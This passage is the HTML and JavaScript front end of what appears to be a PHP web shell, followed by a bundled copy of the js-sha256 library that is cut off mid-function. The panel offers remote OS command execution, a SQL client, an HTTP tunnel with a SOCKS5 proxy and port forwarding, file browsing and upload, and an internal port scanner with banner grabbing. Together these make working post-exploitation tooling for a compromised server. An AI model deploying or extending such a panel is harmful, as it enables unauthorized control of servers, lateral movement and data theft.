                <button type="button" class="btn btn-sm btn-secondary" onclick="streamClear('os-shell-output')">Clear</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamCopy('os-shell-output')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M6 1v1H3v13h10V2h-3V1zm1 1h2v2H7V2zM5 4h6v10H5z"/></svg> Copy</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamDownload('os-shell-output','os-shell')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 1v7L4.5 5.5l-1.4 1.4L8 11.8l4.9-4.9-1.4-1.4L9 8V1zM2 13v2h12v-2z"/></svg> Download</button>
              </div>
            </div>
          </header>
          <div class="card-body card-body--flush">
                        <div id="bypass-panel" style="padding:8px 12px;border-bottom:1px solid var(--border);font-size:12px;" hidden></div>
                        <div class="terminal-stream terminal-stream--tall" id="os-shell-output" role="log" aria-live="polite"></div>
            <div class="terminal-composer">
              <label class="sr-only" for="os-shell-input">Shell command</label>
              <span class="terminal-prefix" id="os-shell-prompt" aria-hidden="true">$</span>
              <textarea id="os-shell-input" class="terminal-input" placeholder="shell command  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history  ·  Ctrl+L clear" autocomplete="off" spellcheck="false"></textarea>
            </div>
          </div>
        </article>
        <article class="card" id="sql-card">
          <header class="card-header card-header-3col">
            <div class="card-header-left"><span class="card-header-name">SQL</span> <span id="sql-status"></span></div>
            <div class="card-header-mid">
              <span class="card-header-label">snippets:</span>
              <div id="sql-snippet-buttons" class="btn-group"></div>
            </div>
            <div class="card-header-right">
              <div class="btn-group">
                <button type="button" class="btn btn-sm btn-secondary" onclick="sqlToggleSettings()" aria-expanded="false" aria-controls="sql-settings-panel">Connect</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamClear('sql-output')">Clear</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamCopy('sql-output')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M6 1v1H3v13h10V2h-3V1zm1 1h2v2H7V2zM5 4h6v10H5z"/></svg> Copy</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamDownload('sql-output','sql-query')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 1v7L4.5 5.5l-1.4 1.4L8 11.8l4.9-4.9-1.4-1.4L9 8V1zM2 13v2h12v-2z"/></svg> Download</button>
              </div>
            </div>
          </header>
          <div id="sql-settings-panel" class="sql-settings-panel" hidden>
            <div class="grid-4">
              <label class="form-label">Type
                <select class="form-control" id="sql-driver" onchange="sqlDriverChange()">
                  <option value="mysql">MySQL</option>
                  <option value="pgsql">PostgreSQL</option>
                </select>
              </label>
              <label class="form-label">Host
                <input type="text" class="form-control" id="sql-host" placeholder="127.0.0.1">
              </label>
              <label class="form-label">Port
                <input type="text" class="form-control" id="sql-port" placeholder="3306">
              </label>
              <label class="form-label">Database
                <input type="text" class="form-control" id="sql-db" placeholder="mydb">
              </label>
            </div>
            <div class="grid-4">
              <label class="form-label">User
                <input type="text" class="form-control" id="sql-user" placeholder="root" autocomplete="off">
              </label>
              <label class="form-label">Password
                <input type="password" class="form-control" id="sql-password" autocomplete="new-password">
              </label>
            </div>
            <button type="button" class="btn btn-sm btn-primary" onclick="sqlConnect()">Test &amp; Connect</button>
            <span id="sql-connect-status"></span>
          </div>
          <div class="card-body card-body--flush">
            <div class="terminal-stream terminal-stream--tall" id="sql-output" role="log" aria-live="polite"></div>
            <div class="terminal-composer">
              <label class="sr-only" for="sql-input">SQL query</label>
              <span class="terminal-prefix" id="sql-prompt" aria-hidden="true">sql&gt;</span>
              <textarea id="sql-input" class="terminal-input" placeholder="SQL query  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history  ·  click Connect first" spellcheck="false"></textarea>
            </div>
          </div>
        </article>
      </section>

      <section class="tab-content" id="tab-tunnel" aria-label="Tunnel">
        <article class="card">
          <header class="card-header">
            Multiplexed Tunnel
            <div class="btn-group">
              <span id="tunnel-status">Idle</span>
              <button type="button" class="btn btn-sm btn-secondary" onclick="tunnelRefresh()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 2a6 6 0 00-6 6h1.5A4.5 4.5 0 018 3.5c1 0 1.8.3 2.5.8L9 6h5V1l-1.5 1.5A6 6 0 008 2zm6 6h-1.5A4.5 4.5 0 018 12.5c-1 0-1.8-.3-2.5-.8L7 10H2v5l1.5-1.5A6 6 0 008 14a6 6 0 006-6z"/></svg> Refresh</button>
            </div>
          </header>
          <div class="card-body">
            <p class="text-muted mb-16">
              Multiplexed HTTP tunnel with SOCKS5 proxy &amp; port forwarding. Use with <span class="text-yellow mono-sm">webtun.py</span> client.
            </p>
            <div class="mb-12">
              <div class="form-label">Tunnel Endpoint URL:</div>
              <div class="flex-row">
                <input type="text" class="form-control form-control--grow" id="tunnel-url" readonly>
                <button type="button" class="btn btn-sm btn-secondary" onclick="navigator.clipboard.writeText(document.getElementById('tunnel-url').value).then(()=>this.textContent='Copied!',()=>{})"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M6 1v1H3v13h10V2h-3V1zm1 1h2v2H7V2zM5 4h6v10H5z"/></svg> Copy</button>
              </div>
            </div>
            <div class="mb-12">
              <div class="form-label">Client commands:</div>
              <code class="code-block" id="tunnel-cmd"></code>
              <code class="code-block code-block--sm" id="tunnel-cmd-fwd"></code>
            </div>
            <button type="button" class="btn btn-primary" onclick="tunnelCheck()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M5 1v4H4v3a3 3 0 002 2.8V12a2 2 0 002 2 2 2 0 002-2v-1.2A3 3 0 0012 8V5h-1V1h-1v4H6V1z"/></svg> Test Connection</button>
            <div id="tunnel-test-result"></div>
          </div>
        </article>
        <article class="card">
          <header class="card-header">Active Sessions</header>
          <div class="card-body" id="tunnel-sessions">
            <p class="empty-state">No active tunnel sessions. Start tunnel from Python client.</p>
          </div>
        </article>
        <article class="card">
          <header class="card-header">Requirements</header>
          <div class="card-body" id="tunnel-reqs">
            <p class="empty-state">Click &quot;Test Connection&quot; to check server capabilities.</p>
          </div>
        </article>
      </section>

      <section class="tab-content" id="tab-files" aria-label="Files">
        <article class="card">
          <header class="card-header files-toolbar">
            <span class="files-toolbar-title">File Browser</span>
            <input type="text" class="form-control files-path" id="files-path-input" value="<?= htmlspecialchars($dir) ?>" aria-label="Directory path">
            <button type="button" class="btn btn-sm btn-primary" onclick="browseDir(document.getElementById('files-path-input').value)">Go</button>
            <span class="files-toolbar-sep" aria-hidden="true"></span>
            <input type="file" id="upload-input" class="files-upload-input" title="Choose file to upload to current directory">
            <button type="button" class="btn btn-sm btn-primary" onclick="uploadFile()" title="Upload chosen file to current directory"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 1L3.1 5.9l1.4 1.4L7 4.8V12h2V4.8l2.5 2.5 1.4-1.4zM2 13v2h12v-2z"/></svg> Upload</button>
            <span id="upload-status" class="files-upload-status"></span>
          </header>
          <div class="card-body card-body--flush">
            <div id="files-body">
              <p class="empty-state--pad">Loading...</p>
            </div>
          </div>
        </article>
      </section>

      <section class="tab-content" id="tab-scanner" aria-label="Scanner">
        <article class="card">
          <header class="card-header">
            New Port Scan
            <span class="card-header-hint">runs in background — navigate freely</span>
          </header>
          <div class="card-body">
            <div class="grid-2">
              <div>
                <label class="form-label" for="scan-targets">Targets (CIDR, IPs, hosts, a.b.c.x-y)</label>
                <input type="text" class="form-control" id="scan-targets" placeholder="192.168.1.0/24, 10.0.0.1, host.local">
              </div>
              <div>
                <div class="form-label-row">
                  <label for="scan-ports">Ports (csv + ranges)</label>
                  <span class="text-muted-2xs">presets (Nmap freq):</span>
                </div>
                <input type="text" class="form-control" id="scan-ports" placeholder="22,80,443,8000-8100" value="21,22,23,25,80,110,143,443,3306,3389,5432,5900,6379,8080,8443,9200,11211,27017">
                <div class="flex-wrap-gap">
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('tcp_small')" title="TCP·small (30 ports) — quick triage: Nmap top-20 + modern essentials">TCP·small</button>
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('tcp_common')" title="TCP·common (136 ports) — Nmap top-100 ∪ modern stack">TCP·common</button>
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('tcp_all')" title="TCP·all (1-65535) — exhaustive, slow">TCP·all</button>
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('udp_small')" title="UDP·small (18 ports)">UDP·small</button>
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('udp_common')" title="UDP·common (51 ports)">UDP·common</button>
                  <button type="button" class="btn btn-sm btn-secondary btn-preset" onclick="scanFillPorts('udp_all')" title="UDP 1-1024 well-known range">UDP·all</button>
                </div>
              </div>
            </div>
            <div class="grid-4">
              <div>
                <label class="form-label" for="scan-proto">Protocol</label>
                <select class="form-control" id="scan-proto">
                  <option value="tcp" selected>TCP</option>
                  <option value="udp">UDP</option>
                  <option value="both">TCP + UDP</option>
                </select>
              </div>
              <div>
                <label class="form-label" for="scan-concurrency">Concurrency</label>
                <input class="form-control" id="scan-concurrency" type="number" min="1" max="512" value="64">
              </div>
              <div>
                <label class="form-label" for="scan-timeout">Timeout (ms)</label>
                <input class="form-control" id="scan-timeout" type="number" min="50" max="10000" value="800">
              </div>
              <div>
                <label class="form-label" for="scan-batch">Batch (ms)</label>
                <input class="form-control" id="scan-batch" type="number" min="200" max="10000" value="1500">
              </div>
            </div>
            <label class="form-check">
              <input type="checkbox" id="scan-fingerprint" checked>
              Fingerprint open ports (banner grab + TLS cert)
            </label>
            <button type="button" class="btn btn-primary" id="scan-start-btn" onclick="scanStart()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M3 2v12l11-6L3 2z"/></svg> Start Scan</button>
          </div>
        </article>
        <article class="card">
          <header class="card-header">Scans</header>
          <div class="card-body card-body--compact" id="scans-body">
            <p class="empty-state--pad-sm">Loading...</p>
          </div>
        </article>
      </section>

      <section class="tab-content" id="tab-diag" aria-label="Diagnostics">
        <article class="card">
          <header class="card-header">
            System Diagnostics
            <div class="btn-group">
              <button type="button" class="btn btn-sm btn-secondary" onclick="faradayExportDiag()" title="Export the loaded diagnostics blob as a faraday_json file">&#x2191; Faraday</button>
              <button type="button" class="btn btn-sm btn-primary" onclick="loadDiag()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 2a6 6 0 00-6 6h1.5A4.5 4.5 0 018 3.5c1 0 1.8.3 2.5.8L9 6h5V1l-1.5 1.5A6 6 0 008 2zm6 6h-1.5A4.5 4.5 0 018 12.5c-1 0-1.8-.3-2.5-.8L7 10H2v5l1.5-1.5A6 6 0 008 14a6 6 0 006-6z"/></svg> Refresh</button>
            </div>
          </header>
          <div class="card-body" id="diag-body">
            <p class="empty-state">Click Refresh to load diagnostics.</p>
          </div>
        </article>
      </section>

      <section class="tab-content" id="tab-history" aria-label="History">
        <article class="card">
          <header class="card-header">
            Command History
            <div class="btn-group">
              <button type="button" class="btn btn-sm btn-secondary" onclick="exportHistory()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 1v7L4.5 5.5l-1.4 1.4L8 11.8l4.9-4.9-1.4-1.4L9 8V1zM2 13v2h12v-2z"/></svg> Export</button>
              <button type="button" class="btn btn-sm btn-danger" onclick="clearHistory()">Clear</button>
            </div>
          </header>
          <div class="card-body" id="history-body">
            <p class="empty-state">No history yet.</p>
          </div>
        </article>
      </section>

    </div>
  </main>
</div>


<script>
window.TERMINAL_SNIPPETS = <?= json_encode($TERMINAL_SNIPPETS ?? [], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?>;
const __BUILD = {"hash": "5ab79e7aa648b978717f61b43d36a89d1ccd37fa1870cfdbf7b509a9762e5c47", "short_id": "5ab79e7a", "timestamp": "2026-11-16T15:18:36Z", "lang": "php", "version": "2.0.0", "seed": "", "encrypted": true};
// Base URL — always post to script path without query params
const BASE_URL = location.pathname;

// Safe fetch — returns parsed JSON or throws with raw body visible in message
function fetchJSON(fd) {
  return fetch(BASE_URL, { method: 'POST', body: fd })
    .then(r => r.text())
    .then(text => {
      try { return JSON.parse(text); }
      catch(e) { throw new Error('PHP returned non-JSON:\n' + text.substring(0, 500)); }
    });
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function clipCopy(text) {
  if (navigator.clipboard && window.isSecureContext) {
    return navigator.clipboard.writeText(text);
  }
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.left = '-9999px';
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  document.body.removeChild(ta);
  return Promise.resolve();
}

// ==================== CLICK TO COPY ====================
// Any element with the .copyable class becomes click-to-copy. By default
// copies its own textContent; pass data-copy="..." to copy custom text.
// Briefly swaps text to "✓ copied" + adds .copied class for feedback.
document.addEventListener('click', e => {
  const el = e.target.closest('.copyable');
  if (!el) return;
  const text = (el.dataset.copy && el.dataset.copy !== 'self') ? el.dataset.copy : el.textContent;
  if (!text || el.classList.contains('copied')) return;  // ignore re-clicks during feedback window
  clipCopy(text).then(() => {
    const orig = el.textContent;
    el.classList.add('copied');
    el.textContent = '✓ copied';
    setTimeout(() => {
      el.classList.remove('copied');
      el.textContent = orig;
    }, 900);
  });
});

// ==================== TAB NAVIGATION ====================
document.querySelectorAll('.sidebar-nav a').forEach(a => {
  a.addEventListener('click', e => {
    e.preventDefault();
    document.querySelectorAll('.sidebar-nav a').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
    a.classList.add('active');
    document.getElementById('tab-' + a.dataset.tab).classList.add('active');
    if (a.dataset.tab === 'history' && typeof renderHistory === 'function') renderHistory();
    if (a.dataset.tab === 'files' && typeof browseDir === 'function') browseDir(document.getElementById('files-path-input').value);
    if (a.dataset.tab === 'diag' && typeof loadDiag === 'function') loadDiag();
    if (a.dataset.tab === 'scanner' && typeof renderScans === 'function') renderScans();
    if (a.dataset.tab === 'tunnel' && typeof tunnelRefresh === 'function') tunnelRefresh();
  });
});


/**
 * [js-sha256]{@link https://github.com/emn178/js-sha256}
 *
 * @version 0.11.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2014-2024
 * @license MIT
 */
/*jslint bitwise: true */
(function () {
  'use strict';

  var ERROR = 'input is invalid type';
  var WINDOW = typeof window === 'object';
  var root = WINDOW ? window : {};
  if (root.JS_SHA256_NO_WINDOW) {
    WINDOW = false;
  }
  var WEB_WORKER = !WINDOW && typeof self === 'object';
  var NODE_JS = !root.JS_SHA256_NO_NODE_JS && typeof process === 'object' && process.versions && process.versions.node;
  if (NODE_JS) {
    root = global;
  } else if (WEB_WORKER) {
    root = self;
  }
  var COMMON_JS = !root.JS_SHA256_NO_COMMON_JS && typeof module === 'object' && module.exports;
  var AMD = typeof define === 'function' && define.amd;
  var ARRAY_BUFFER = !root.JS_SHA256_NO_ARRAY_BUFFER && typeof ArrayBuffer !== 'undefined';
  var HEX_CHARS = '0123456789abcdef'.split('');
  var EXTRA = [-2147483648, 8388608, 32768, 128];
  var SHIFT = [24, 16, 8, 0];
  var K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
  ];
  var OUTPUT_TYPES = ['hex', 'array', 'digest', 'arrayBuffer'];

  var blocks = [];

  if (root.JS_SHA256_NO_NODE_JS || !Array.isArray) {
    Array.isArray = function (obj) {
      return Object.prototype.toString.call(obj) === '[object Array]';
    };
  }

  if (ARRAY_BUFFER && (root.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW || !ArrayBuffer.isView)) {
    ArrayBuffer.isView = function (obj) {
      return typeof obj === 'object' && obj.buffer && obj.buffer.constructor === ArrayBuffer;
    };
  }

  var createOutputMethod = function (outputType, is224) {
    return function (message) {
      return new Sha256(is224, true).update(message)[outputType]();
    };
  };

  var createMethod = function (is224) {
    var method = createOutputMethod('hex', is224);
    if (NODE_JS) {
      method = nodeWrap(method, is224);
    }
    method.create = function () {
      return new Sha256(is224);
    };
    method.update = function (message) {
      return method.create().update(message);
    };
    for (var i = 0; i < OUTPUT_TYPES.length; ++i) {
      var type = OUTPUT_TYPES[i];
      method[type] = createOutputMethod(type, is224);
    }
    return method;
  };

  var nodeWrap = function (method, is224) {
    var crypto = require('crypto')
    var Buffer = require('buffer').Buffer;
    var algorithm = is224 ? 'sha224' : 'sha256';
    var bufferFrom;
    if (Buffer.from && !root.JS_SHA256_NO_BUFFER_FROM) {
      bufferFrom = Buffer.from;
    } else {
      bufferFrom = function (message) {
        return new Buffer(message);
      };
    }
    var nodeMethod = function (message) {
      if (typeof message === 'string') {
        return crypto.createHash(algorithm).update(message, 'utf8').digest('hex');
      } else {
        if (message === null || message === undefined) {
          throw new Error(ERROR);
        } else if (message.constructor === ArrayBuffer) {
          message = new Uint8Array(message);
        }
      }
      if (Array.isArray(message) || ArrayBuffer.isView(message) ||
        message.constructor === Buffer) {
        return crypto.createHash(algorithm).update(bufferFrom(message)).digest('hex');
      } else {
        return method(message);
      }
    };
    return nodeMethod;
  };

  var createHmacOutputMethod = function (outputType, is224) {
    return function (key, message) {
      return new HmacSha256(key, is224, true).update(message)[outputType]();
    };
  };

  var createHmacMethod = function (is224) {
    var method = createHmacOutputMethod('hex', is224);
    method.create = function (key) {
      return new HmacSha256(key, is224);
    };
    method.update = function (key, message) {
      return method.create(key).update(message);
    };
    for (var i = 0; i < OUTPUT_TYPES.length; ++i) {
      var type = OUTPUT_TYPES[i];
      method[type] = createHmacOutputMethod(type, is224);
    }
    return method;
  };

  function Sha256(is224, sharedMemory) {
    if (sharedMemory) {
      blocks[0] = blocks[16] = blocks[1] = blocks[2] = blocks[3] =
        blocks[4] = blocks[5] = blocks[6] = blocks[7] =
        blocks[8] = blocks[9] = blocks[10] = blocks[11] =
        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      this.blocks = blocks;
    } else {
      this.blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    }

    if (is224) {
      this.h0 = 0xc1059ed8;
      this.h1 = 0x367cd507;
      this.h2 = 0x3070dd17;
      this.h3 = 0xf70e5939;
      this.h4 = 0xffc00b31;
      this.h5 = 0x68581511;
      this.h6 = 0x64f98fa7;
      this.h7 = 0xbefa4fa4;
    } else { // 256
      this.h0 = 0x6a09e667;
      this.h1 = 0xbb67ae85;
      this.h2 = 0x3c6ef372;
      this.h3 = 0xa54ff53a;
      this.h4 = 0x510e527f;
      this.h5 = 0x9b05688c;
      this.h6 = 0x1f83d9ab;
      this.h7 = 0x5be0cd19;
    }

    this.block = this.start = this.bytes = this.hBytes = 0;
    this.finalized = this.hashed = false;
    this.first = true;
    this.is224 = is224;
  }

  Sha256.prototype.update = function (message) {
    if (this.finalized) {
      return;
    }
    var notString, type = typeof message;
    if (type !== 'string') {
      if (type === 'object') {
        if (message === null) {
          throw new Error(ERROR);
        } else if (ARRAY_BUFFER && message.constructor === ArrayBuffer) {
          message = new Uint8Array(message);
        } else if (!Array.isArray(message)) {
          if (!ARRAY_BUFFER || !ArrayBuffer.isView(message)) {
            throw new Error(ERROR);
          }
        }
      } else {
        throw new Error(ERROR);
      }
      notString = true;
    }
    var code, index = 0, i, length = message.length, blocks = this.blocks;
    while (index < length) {
      if (this.hashed) {
        this.hashed = false;
        blocks[0] = this.block;
        this.block = blocks[16] = blocks[1] = blocks[2] = blocks[3] =
          blocks[4] = blocks[5] = blocks[6] = blocks[7] =
          blocks[8] = blocks[9] = blocks[10] = blocks[11] =
          blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      }

      if (notString) {
        for (i = this.start; index < length && i < 64; ++index) {
          blocks[i >>> 2] |= message[index] << SHIFT[i++ & 3];
        }
      } else {
        for (i = this.start; index < length && i < 64; ++index) {
          code = message.charCodeAt(index);
          if (code < 0x80) {
            blocks[i >>> 2] |= code << SHIFT[i++ & 3];
          } else if (code < 0x800) {
            blocks[i >>> 2] |= (0xc0 | (code >>> 6)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          } else if (code < 0xd800 || code >= 0xe000) {
            blocks[i >>> 2] |= (0xe0 | (code >>> 12)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 6) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          } else {
            code = 0x10000 + (((code & 0x3ff) << 10) | (message.charCodeAt(++index) & 0x3ff));
            blocks[i >>> 2] |= (0xf0 | (code >>> 18)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 12) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | ((code >>> 6) & 0x3f)) << SHIFT[i++ & 3];
            blocks[i >>> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
          }
        }
      }

      this.lastByteIndex = i;
      this.bytes += i - this.start;
      if (i >= 64) {
        this.block = blocks[16];
        this.start = i - 64;
        this.hash();
        this.hashed = true;
      } else {
        this.start = i;
      }
    }
    if (this.bytes > 4294967295) {
      this.hBytes += this.bytes / 4294967296 << 0;
      this.bytes = this.bytes % 4294967296;
    }
    return this;
  };

  Sha256.prototype.finalize = function () {
    if (this.finalized) {
      return;
    }
    this.finalized = true;
    var blocks = this.blocks, i = this.lastByteIndex;
    blocks[16] = this.block;
    blocks[i >>> 2] |= EXTRA[i & 3];
    this.block = blocks[16];
    if (i >= 56) {
      if (!this.hashed) {
        this.hash();
      }
      blocks[0] = this.block;
      blocks[16] = blocks[1] = blocks[2] = blocks[3] =
        blocks[4] = blocks[5] = blocks[6] = blocks[7] =
        blocks[8] = blocks[9] = blocks[10] = blocks[11] =
        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
    }
    blocks[14] = this.hBytes << 3 | this.bytes >>> 29;
    blocks[15] = this.bytes << 3;
    this.hash();
  };

  Sha256.prototype.hash = function () {
    var a = this.h0, b = this.h1, c = this.h2, d = this.h3, e = this.h4, f = this.h5, g = this.h6,
      h = this.h7, blocks = this.blocks, j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;

    for (j = 16; j < 64; ++j) {
      // rightrotate
      t1 = blocks[j - 15];
      s0 = ((t1 >>> 7) | (t1 << 25)) ^ ((t1 >>> 18) | (t1 << 14)) ^ (t1 >>> 3);
      t1 = blocks[j - 2];
      s1 = ((t1 >>> 17) | (t1 << 15)) ^ ((t1 >>> 19) | (t1 << 13)) ^ (t1 >>> 10);
      blocks[j] = blocks[j - 16] + s0 + blocks[j - 7] + s1 << 0;
    }

    bc = b & c;
    for (j = 0; j < 64; j += 4) {
      if (this.first) {
        if (this.is224) {
          ab = 300032;
          t1 = blocks[0] - 1413257819;
          h = t1 - 150054599 << 0;
          d = t1 + 24177077 << 0;
        } else {
          ab = 704751109;
          t1 = blocks[0] - 210244248;
          h = t1 - 1521486534 << 0;
          d = t1 + 143694565 << 0;
        }
        this.first = false;
      } else {
        s0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
        s1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
        ab = a & b;
        maj = ab ^ (a & c) ^ bc;
        ch = (e & f) ^ (~e & g);
        t1 = h + s1 + ch + K[j] + blocks[j];
        t2 = s0 + maj;
        h = d + t1 << 0;
        d = t1 + t2 << 0;
      }
      s0 = ((d >>> 2) | (d << 30)) ^ ((d >>> 13) | (d << 19)) ^ ((d >>> 22) | (d << 10));
      s1 = ((h >>> 6) | (h << 26)) ^ ((h >>> 11) | (h << 21)) ^ ((h >>> 25) | (h << 7));
      da = d & a;
      maj = da ^ (d & b) ^ ab;
      ch = (h & e) ^ (~h & f);
      t1 = g + s1 + ch + K[j + 1] + blocks[j + 1];
      t2 = s0 + maj;
      g = c + t1 << 0;
      c = t1 + t2 << 0;
      s0 = ((c >>> 2) | (c << 30)) ^ ((c >>> 13) | (c << 19)) ^ ((c >>> 22) | (c << 10));
      s1 = ((g >>> 6) | (g << 26)) ^ ((g >>> 11) | (g << 21)) ^ ((g >>> 25) | (g << 7));
      cd = c & d;
      maj = cd ^ (c & a) ^ da;
      ch = (g & h) ^ (~g & e);
      t1 = f + s1 + ch + K[j + 2] + blocks[j + 2];
      t2 = s0 + maj;
      f = b + t1 << 0;
      b = t1 + t2 << 0;
      s0 = ((b >>> 2) | (b << 30)) ^ ((b >>> 13) | (b << 19)) ^ ((b >>> 22) | (b << 10));
      s1 = ((f >>> 6) | (f << 26)) ^ ((f >>> 11) | (f << 21)) ^ ((f >>> 25) | (f << 7));
      bc = b & c;
      maj = bc ^ (b & d) ^ cd;
      ch = (f & g) ^ (~f & h);
      t1 = e + s1 + ch + K[j + 3] + blocks[j + 3];
      t2 = s0 + maj;
      e = a + t1 << 0;
      a = t1 + t2 << 0;
      this.chromeBugWorkAround = true;
    }

    this.h0 = this.h0 + a << 0;
    this.h1 = this.h1 + b << 0;
    this.h2 = this.h2 + c << 0;
    this.h3 = this.h3 + d << 0;
    this.h4 = this.h4 + e << 0;
    this.h5 = this.h5 + f << 0;
    this.h6 = this.h6 + g << 0;
    this.h7 = this.h7 + h << 0;
  };

  Sha256.prototype.hex = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,
      h6 = this.h6, h7 = this.h7;

    var hex = HEX_CHARS[(h0 >>> 28) & 0x0F] + HEX_CHARS[(h0 >>> 24) & 0x0F] +
      HEX_CHARS[(h0 >>> 20) & 0x0F] + HEX_CHARS[(h0 >>> 16) & 0x0F] +
      HEX_CHARS[(h0 >>> 12) & 0x0F] + HEX_CHARS[(h0 >>> 8) & 0x0F] +
      HEX_CHARS[(h0 >>> 4) & 0x0F] + HEX_CHARS[h0 & 0x0F] +
      HEX_CHARS[(h1 >>> 28) & 0x0F] + HEX_CHARS[(h1 >>> 24) & 0x0F] +
      HEX_CHARS[(h1 >>> 20) & 0x0F] + HEX_CHARS[(h1 >>> 16) & 0x0F] +
      HEX_CHARS[(h1 >>> 12) & 0x0F] + HEX_CHARS[(h1 >>> 8) & 0x0F] +
      HEX_CHARS[(h1 >>> 4) & 0x0F] + HEX_CHARS[h1 & 0x0F] +
      HEX_CHARS[(h2 >>> 28) & 0x0F] + HEX_CHARS[(h2 >>> 24) & 0x0F] +
      HEX_CHARS[(h2 >>> 20) & 0x0F] + HEX_CHARS[(h2 >>> 16) & 0x0F] +
      HEX_CHARS[(h2 >>> 12) & 0x0F] + HEX_CHARS[(h2 >>> 8) & 0x0F] +
      HEX_CHARS[(h2 >>> 4) & 0x0F] + HEX_CHARS[h2 & 0x0F] +
      HEX_CHARS[(h3 >>> 28) & 0x0F] + HEX_CHARS[(h3 >>> 24) & 0x0F] +
      HEX_CHARS[(h3 >>> 20) & 0x0F] + HEX_CHARS[(h3 >>> 16) & 0x0F] +
      HEX_CHARS[(h3 >>> 12) & 0x0F] + HEX_CHARS[(h3 >>> 8) & 0x0F] +
      HEX_CHARS[(h3 >>> 4) & 0x0F] + HEX_CHARS[h3 & 0x0F] +
      HEX_CHARS[(h4 >>> 28) & 0x0F] + HEX_CHARS[(h4 >>> 24) & 0x0F] +
      HEX_CHARS[(h4 >>> 20) & 0x0F] + HEX_CHARS[(h4 >>> 16) & 0x0F] +
      HEX_CHARS[(h4 >>> 12) & 0x0F] + HEX_CHARS[(h4 >>> 8) & 0x0F] +
      HEX_CHARS[(h4 >>> 4) & 0x0F] + HEX_CHARS[h4 & 0x0F] +
      HEX_CHARS[(h5 >>> 28) & 0x0F] + HEX_CHARS[(h5 >>> 24) & 0x0F] +
      HEX_CHARS[(h5 >>> 20) & 0x0F] + HEX_CHARS[(h5 >>> 16) & 0x0F] +
      HEX_CHARS[(h5 >>> 12) & 0x0F] + HEX_CHARS[(h5 >>> 8) & 0x0F] +
      HEX_CHARS[(h5 >>> 4) & 0x0F] + HEX_CHARS[h5 & 0x0F] +
      HEX_CHARS[(h6 >>> 28) & 0x0F] + HEX_CHARS[(h6 >>> 24) & 0x0F] +
